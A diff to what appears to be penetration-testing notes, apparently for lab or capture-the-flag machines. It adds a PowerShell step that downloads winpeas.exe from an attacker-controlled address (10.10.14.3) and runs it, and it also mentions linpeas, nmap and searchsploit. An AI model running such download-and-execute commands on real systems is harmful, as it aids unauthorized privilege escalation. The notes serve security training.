@@ -22,6 +22,14 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
+Similar in windows:
+
+```powershell
+cd C:\Users\User\Desktop
+iwr -uri http://10.10.14.3/winpeas.exe -outfile winpeas.exe
+.\winpeas.exe
+```
+
 ## Outside the machine
 
 If you are outside the machine, you can use tools like `nmap` to scan for open ports and identify services running on those ports. Once you have identified the services running on the target, you can use tools like `nmap` and `searchsploit` to identify potential vulnerabilities in those services.
